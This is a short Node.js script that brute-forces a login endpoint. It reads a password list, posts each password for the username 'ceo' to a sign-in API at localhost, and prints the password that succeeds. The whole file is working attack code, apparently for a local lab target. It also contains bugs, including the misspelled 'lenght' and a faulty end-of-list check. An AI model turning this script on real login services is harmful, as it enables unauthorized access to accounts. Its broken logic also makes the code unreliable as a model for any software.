const request = require("request");

const fs = require("fs");
const axios = require("axios");
const commonPasswordsFile = "user_password.txt";
const username = "ceo";

fs.readFile(commonPasswordsFile, "utf8", (err, data) => {
  if (err) throw err;
  let commonPasswords = data.split("\n");
  commonPasswords = commonPasswords.map((possiblePasswords) =>
    possiblePasswords.replace("\r", "")

  );

  rec_bf(username, commonPasswords, 0, "");

});
async function rec_bf(username, commonPasswords, i, passwordR) {
  if (!commonPasswords) {
    console.log(
      `correct password for username ${username} : ${passwordR}`
    );
    return;
  }
  const password = commonPasswords[i];
  const dataCeo = {
    username: username,
    password: password,

  };
  await axios
    .post("http://localhost:8081/api/auth/signin", dataCeo)
    .then((response) => {
      rec_bf(username, null, i, password);

    })
     .catch((error) => {
      if (error.response.status == 401) {
        if (i == commonPasswords.lenght) {
          rec_bf(username, [], i, "");
        } else {
          const j = i + 1;
          rec_bf(username, commonPasswords, j, "");
        }

      }

    });

}